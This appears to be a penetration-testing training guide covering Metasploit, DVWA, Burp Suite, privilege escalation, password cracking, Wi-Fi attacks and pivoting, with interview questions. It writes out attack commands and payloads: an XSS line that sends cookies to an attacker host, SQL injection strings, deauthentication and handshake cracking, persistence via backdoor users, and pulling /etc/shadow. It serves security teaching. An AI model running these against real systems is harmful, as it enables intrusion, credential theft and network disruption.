Intro to Metasploit Framework
Metasploit in the Equifax Breach
// architecture
Exploit Module
Code that delivers payload through a specific vulnerability. Selected by search, configured with RHOSTS/PAYLOAD.
Payload
What runs after exploitation — reverse shell, bind shell, meterpreter. Staged vs stageless matters for size.
Auxiliary Module
Scanning, fuzzing, DoS — non-exploitation tools. Used for recon inside msfconsole.
Post Module
Runs after a session is open — privilege escalation, hash dumping, keylogging, persistence.
Meterpreter
In-memory payload that lives entirely in RAM. No files written to disk — evades antivirus detection.
// commands
msfconsole
Launch Metasploit. First thing you type every session.
search vsftpd
Find modules by keyword — searches exploit titles, descriptions, and CVE numbers.
use exploit/unix/ftp/vsftpd_234_backdoor
Load a specific module; path structure = OS/service/vulnerability_name.
show options / set RHOSTS <ip>
View and set required parameters. Every module has its own options set.
run / exploit
Fire the exploit. On success, opens a session — use 'run -j' to background it.
sessions -i 1
Interact with session ID 1. Use 'sessions -l' to list all open sessions.
sysinfo / getuid
Meterpreter commands — OS details and current user. First check post-exploitation.
// real incident

Metasploit in Equifax (2017): Attackers used publicly available Metasploit modules for Apache Struts CVE-2017-5638. The same open-source framework available to every pentester was weaponized against a Fortune 500 company. Lesson: know what your tools can do — so does everyone else.

// interview answer
Q: Explain the difference between staged and stageless payloads in Metasploit.
A staged payload (windows/meterpreter/reverse_tcp) sends a small stub first, then fetches the larger stage over the network — good for small buffer sizes. A stageless payload (windows/meterpreter_reverse_tcp, note the underscore) is fully self-contained but much larger. Use staged when exploit space is tight; stageless when reliability matters and size isn't constrained.

Exploiting a Vulnerable VM (Metasploitable)
Metasploitable as Training Standard
// full attack chain
Recon Phase
nmap -sV -sC -p- target — discover all open ports, services, and versions before touching anything.
Exploitation
Match service version to known exploit — vsftpd 2.3.4 backdoor, UnrealIRCd backdoor, Samba usermap script.
Privilege Escalation
From www-data to root via SUID binaries, kernel exploits, or sudo misconfigurations.
Persistence
Add SSH key, cron job reverse shell, or create a backdoor user. Second visit doesn't require another exploit.
// commands
nmap -sV -sC -p- 192.168.1.10
Full port scan with version and default script detection — every engagement starts here.
use exploit/multi/samba/usermap_script
Load the Samba username map script exploit — a classic Metasploitable 2 win.
python -c 'import pty;pty.spawn("/bin/bash")'
Upgrade a limited shell to a full interactive TTY. Arrow keys, tab completion, job control.
ssh-copy-id user@target
Add your SSH key for persistence — only works if you have creds or passwordless SSH access.
// key rule

The recon phase is longer than the exploitation phase. Running nmap for 15 minutes and exploiting in 3 seconds is normal. Impatience skips ports. Skipping ports misses the entry point.

Burp Suite Basics — Intercepting Traffic
Burp Suite in Bug Bounty Workflows
// suite components
Proxy
Intercepts HTTP/S between browser and server. Toggle interception on/off; modify requests in real time.
Repeater
Send a single request over and over with manual modifications. Test parameter tampering one variable at a time.
Intruder
Automated fuzzing — replaces a payload position with values from a wordlist. Brute-force, fuzz, enumerate.
Decoder
Encode/decode Base64, URL, hex, ASCII. Essential for reading obfuscated parameters.
Comparer
Side-by-side or diff view of two requests/responses. Spot the difference that matters for an exploit.
// commands
Burp Suite → Proxy → Options → 127.0.0.1:8080
Default proxy listener — configure your browser to point here.
CA Certificate → Export → Import into Browser
Install Burp's CA to intercept HTTPS without certificate errors. Step every new Burp user forgets.
Right-click → Send to Repeater
Send any intercepted request to Repeater for manual modification and re-sending.
// real incident

Nearly 80% of professional bug bounty hunters cite Burp Suite as their primary web testing tool. Proxy-intercepted requests reveal parameter names, hidden fields, and CSRF tokens that browsers don't show — the same data attackers modify to exploit IDOR and parameter tampering flaws.

// interview answer
Q: How would you find an Insecure Direct Object Reference (IDOR) using Burp Suite?
Proxy-intercept a request to a resource like /api/user/123. Send to Intruder, mark 123 as the payload position, and iterate through sequential IDs. If the response for 124 returns another user's data without authorization, you've found an IDOR. Repeater confirms it manually before writing the report.

Practicing SQLi & XSS on DVWA
DVWA in Academic Research
// vulnerabilities exploited
SQL Injection
' OR 1=1 -- (low), parameterized queries (high). Extracting usernames and password hashes from database.
Reflected XSS
<script>alert(1)</script> in URL parameter. Input echoed back without sanitization — one-time execution.
Stored XSS
Malicious script saved in guestbook. Every visitor executes it — persistence without repeated phishing.
CSRF
Crafted HTML form submitted from attacker's site changes victim's password. No CSRF token validation on low.
File Upload
Upload PHP shell disguised as image (shell.php.jpg). Insecure file type validation allows arbitrary code upload.
// commands
' UNION SELECT user,password FROM users --
SQLi union injection — extract data from other tables by matching column count.
<script>document.location='http://attacker/?c='+document.cookie</script>
XSS cookie exfiltration — redirects victim's cookies to attacker-controlled server.
<img src=x onerror=alert(1)>
XSS without script tags — bypasses basic filters that block <script> but not event handlers.
<form action="http://target/dvwa/csrf" method="GET">...</form>
CSRF PoC form — hidden auto-submit form that performs actions as the logged-in victim.
// key rule

DVWA levels map to real-world security: Low = no defenses (startup code), Medium = basic filters (bypassable), High = proper parameterized queries and CSP headers. Most real breaches sit between Low and Medium.

Privilege Escalation — Linux
Dirty Pipe CVE-2022-0847
// privesc vectors
SUID Binary Abuse
find / -perm -4000 2>/dev/null — search for binaries running as owner. If owned by root and exploitable, you're root.
Cron Jobs
Writable scripts run by root cron = replace script with reverse shell. Check /etc/crontab and /var/spool/cron.
Kernel Exploits
uname -a → search for matching kernel exploit. Dirty Pipe (CVE-2022-0847) overwrote read-only files including SUID binaries.
Sudo Misconfig
sudo -l reveals what commands user can run as root. If sudo ALL is there without password, game over.
Capabilities
getcap -r / 2>/dev/null. A binary with cap_setuid+ep can escalate — equivalent to SUID but invisible to find.
PATH Hijacking
If a root cron runs a command without full path, create your own version in a writable directory earlier in $PATH.
// commands
find / -perm -4000 -type f 2>/dev/null
Find all SUID root binaries — the first check in every Linux privesc.
sudo -l
List sudo privileges for current user. One (ALL) entry = full root immediately.
uname -a && cat /etc/os-release
Kernel version and OS info — needed to match a kernel exploit.
crontab -l && ls -la /etc/cron*
List user crontab and system-wide cron files — check for writable scripts.
getcap -r / 2>/dev/null
List all binaries with Linux capabilities — invisible SUID alternative.
./linpeas.sh
Automated Linux privilege escalation checker — the first thing you run on an exploited box.
// real incident

Dirty Pipe (CVE-2022-0847, Feb 2022): a vulnerability in Linux's pipe mechanism (present since Kernel 5.8) allowed unprivileged users to overwrite data in read-only files, including SUID binaries. PoC released within 48 hours — every Linux admin scrambled to patch. Affect: millions of Android devices, cloud servers, and embedded Linux systems.

Privilege Escalation — Windows
PrintNightmare CVE-2021-34527
// windows privesc vectors
Service Permissions
Services running as SYSTEM with writable binary paths. Change the binary, restart the service, get SYSTEM.
Unquoted Service Paths
Service path with spaces, no quotes: C:\Program Files\Vuln App\run.exe. Drop executable in the unquoted directory.
Token Impersonation
SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege enabled. Use RogueWinRM or JuicyPotato to impersonate SYSTEM token.
AlwaysInstallElevated
Registry keys set to 1 allow any user to install MSI packages with SYSTEM privileges. Craft malicious MSI, run it, get SYSTEM.
UAC Bypass
Even as admin, you run as standard user unless UAC is bypassed. Techniques: fodhelper, eventvwr, cmstplua.
// commands
whoami /priv
List all privileges. Check for SeImpersonatePrivilege, SeBackupPrivilege, SeTakeOwnershipPrivilege.
wmic service get name,displayname,pathname,startname
List all services with binary paths and account — find unquoted paths and user-owned services.
accesschk.exe -uwcqv "Authenticated Users" *
Sysinternals tool that checks write permissions on services — identifies exploitable service binaries.
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer
Check AlwaysInstallElevated registry — if both HKLM and HKCU keys are set to 1, exploit is available.
./winPEAS.exe
Windows equivalent of linpeas — automated enumeration of every privesc vector at once.
// real incident

PrintNightmare (CVE-2021-34527, Jun 2021): a remote code execution vulnerability in the Windows Print Spooler service allowed unauthenticated attackers to execute arbitrary code with SYSTEM privileges. Widely exploited in ransomware campaigns within days of disclosure. Microsoft's "critical" patch still had bypasses — a reminder that default services are attack surface.

Password Cracking — Hashcat & John the Ripper
Hashcat in LinkedIn Breach Analysis
// hash modes & attack types
Hashcat Mode 0
MD5 — 100M+ hashes/sec on modern GPU. Unsalted: cracked in minutes. Salting changes everything.
Hashcat Mode 1000
NTLM — Windows authentication hash. Slow per-request but fast offline: >10B/sec on RTX 4090.
Hashcat Mode 3200
bcrypt — intentionally slow, $2a$ cost factor 5-12. A few hundred hashes/sec. Resistant to GPU acceleration.
Dictionary Attack (-a 0)
Wordlist + rules. rockyou.txt + best64.rule cracks 60%+ of real-world passwords.
Mask Attack (-a 3)
?l?l?l?l?l?l?d?d — brute-force with pattern. ?l=lower, ?u=upper, ?d=digit, ?s=special.
Rule-based (-r)
Mutation rules: append digit, capitalize, leet substitution. best64.rule converts dictionary to 99% of user passwords.
// commands
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
Crack MD5 hashes (-m 0) with dictionary attack (-a 0) — the baseline command.
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r best64.rule
Crack NTLM hashes with rule-based mutations — catches Summer2024! varieties.
john --format=raw-md5 --wordlist=rockyou.txt hash.txt
John the Ripper equivalent — slower than hashcat but more format-compatible.
hashcat --show -m 0 hash.txt
Display already-cracked hashes from potfile — no need to re-crack.
// real incident

LinkedIn Breach (2012, re-analyzed 2016): 167M unsalted SHA-1 password hashes leaked. Security researchers used Hashcat on GPU clusters and cracked 90% within days. Unsalted SHA-1 = instant loss. bcrypt or Argon2id would have made cracking years-long and cost-prohibitive. Salting is not optional.

Wireless Attacks — Aircrack-ng
Krack WPA2 Attack 2017
// wireless attack chain
Monitor Mode
airmon-ng start wlan0 — puts wireless card in RFMON mode. Card listens to all packets, not just its own network.
Handshake Capture
airodump-ng -c 6 --bssid MAC -w capture wlan0mon — captures the 4-way WPA2 authentication handshake.
Deauth Attack
aireplay-ng -0 10 -a MAC wlan0mon — sends deauthentication packets to force client reconnection and capture handshake.
PSK Cracking
aircrack-ng -w wordlist.txt capture-01.cap — offline dictionary attack against the captured WPA2 handshake.
// commands
airmon-ng start wlan0
Enable monitor mode on wlan0 — creates wlan0mon interface.
airodump-ng wlan0mon
List all visible access points and connected clients — BSSID, channel, encryption, signal strength.
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
Focus capture on a specific AP and channel — writes handshake to capture file.
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
Send 5 deauth packets to broadcast — forces clients to reconnect and re-handshake.
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
Crack the captured WPA2 handshake against a wordlist — offline, rate-limited by GPU.
// real incident

Krack WPA2 Attack (2017): researchers discovered a fundamental flaw in the WPA2 protocol's 4-way handshake, allowing attackers within Wi-Fi range to decrypt traffic, inject malware, and hijack connections without knowing the network password. Every WPA2 device was affected. Patches were OS-level, not router-level. Lesson: protocol flaws bypass password strength entirely.

Post-Exploitation & Pivoting Basics
Colonial Pipeline / Lateral Movement
// pivoting techniques
Meterpreter Autoroute
run post/multi/manage/autoroute SUBNET=10.10.10.0/24 — adds routes through compromised host to internal networks.
SOCKS Proxy
use auxiliary/server/socks_proxy — creates a SOCKS5 tunnel through Metasploit. Combine with proxychains for any tool.
SSH Dynamic Forwarding
ssh -D 1080 user@pivot — SOCKS5 tunnel via SSH. No Metasploit needed. Works with proxychains nmap.
Data Exfiltration
meterpreter: download /etc/shadow; upload linpeas.sh. Move data securely through encrypted C2 channel.
// commands
run autoroute -s 10.10.10.0/24
Meterpreter — add route to internal subnet through current session.
use auxiliary/server/socks_proxy
Start SOCKS5 proxy on attacker machine — routes traffic through Meterpreter session to internal network.
ssh -D 1080 user@jumpbox
SSH dynamic port forwarding — creates SOCKS5 tunnel on port 1080 through SSH session.
proxychains nmap -sT 10.10.10.0/24
Run any tool through SOCKS proxy — proxychains prepends to commands, routes through the tunnel.
download /etc/shadow
Meterpreter — exfiltrate files from compromised host to attacker machine.
upload /opt/linpeas.sh /tmp/
Meterpreter — upload tools to compromised host for further enumeration.
// real incident

Colonial Pipeline (May 2021): DarkSide attackers compromised a VPN credential (no MFA), accessed the IT network, then pivoted to OT systems managing pipeline operations. The $4.4M ransom was paid because critical infrastructure was reachable from the initial foothold. Network segmentation + MFA would have blocked the pivot.

Writing Your First Pentest Report
PTES / OWASP Standards
// report structure
Executive Summary
1-page for non-technical stakeholders. Overall risk rating, business impact, # of findings by severity. No jargon.
Methodology
Scope, tools used, testing approach. Follows PTES or OWASP Testing Guide structure for credibility.
Findings
Per-vulnerability: CVSS score, description, proof-of-concept screenshot, affected assets, remediation steps.
Remediation Summary
Prioritized action items ranked by risk reduction per effort. What to fix first, what can wait.
// commands
CVSS 3.1 Calculator — nvd.nist.gov/vuln-metrics/cvss
Score each finding 0-10. AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = Critical 9.8
screenshot - clipboard + markup
Every finding needs a screenshot PoC. Mark up with arrows/boxes showing exactly where the vulnerability was triggered.
pandoc report.md -o report.pdf
Convert markdown report to PDF. Keep source in markdown, deliver in PDF.
tar -czf report_$(date +%Y%m%d).tar.gz report.pdf screenshots/
Archive and timestamp the deliverable. Version control matters.
// key rule

The report is the deliverable, not the exploitation. A perfect exploit chain with a poorly written report gets ignored. A well-written report with a moderate finding gets fixed. Write for the CISO who reads the exec summary, not the engineer who reads the technical details.

Cover the answers. Say them out loud. If you can't answer one fluently, revisit that day before continuing.

Q01
What is the difference between a staged and stageless Metasploit payload?
Staged sends a small stub that fetches the larger stage (good for small buffers). Stageless is fully self-contained (more reliable, needs more space). Named with underscore: meterpreter_reverse_tcp vs meterpreter/reverse_tcp.
Q02
How did Metasploit play a role in the 2017 Equifax data breach?
Attackers used publicly available Metasploit modules targeting Apache Struts CVE-2017-5638. The same open-source exploitation framework used by defenders was weaponized against a Fortune 500 company.
Q03
How would you find an IDOR vulnerability using Burp Suite?
Proxy-intercept a request like /api/user/123, send to Intruder, mark the ID (123) as payload position, iterate through sequential values. If the response for 124 returns another user's data without authorization, it's an IDOR.
Q04
Name four Linux privilege escalation vectors you would check immediately.
SUID binaries (find / -perm -4000), sudo permissions (sudo -l), writable cron scripts (crontab -l, ls -la /etc/cron*), kernel exploits (uname -a → search for matching exploit).
Q05
What does SeImpersonatePrivilege allow on Windows, and how is it exploited?
Allows a process to impersonate a security principal (like SYSTEM). Exploited using tools like RogueWinRM or JuicyPotato to create a process with SYSTEM's token through COM/DCOM interfaces.
Q06
Why did the LinkedIn 2012 breach allow 90% of passwords to be cracked within days?
Passwords were hashed with unsalted SHA-1. No salt means identical passwords produce identical hashes. GPU-based Hashcat cracked 167M hashes at billions per second. bcrypt or Argon2id with a per-user salt would have reduced the crack rate to near zero.
Q07
What is the WPA2 4-way handshake, and how do you capture it to crack offline?
The 4-way handshake is the authentication exchange between client and AP. Use airodump-ng to monitor, aireplay-ng to send deauth packets forcing reconnection, capture the handshake to a .cap file, then crack with aircrack-ng -w wordlist capture.cap.
Q08
Explain the Colonial Pipeline attack in terms of pivoting and lateral movement.
DarkSide compromised a VPN credential (no MFA), gaining initial access to the IT network. They then pivoted through the network to reach OT systems managing pipeline operations — a lateral movement from IT to OT. Network segmentation between IT and OT would have prevented the pivot.
Q09
What four sections does every professional pentest report need?
Executive Summary (non-technical, 1 page), Methodology (scope, tools, approach), Findings (per-vuln: CVSS, PoC screenshot, remediation), Remediation Summary (prioritized fix list).
Q10
What was Dirty Pipe (CVE-2022-0847) and why was it significant?
A Linux kernel vulnerability in the pipe mechanism (kernel 5.8+) that let unprivileged users overwrite read-only files including SUID binaries. Affected millions of Android devices, cloud servers, and embedded systems. PoC released within 48 hours of disclosure.
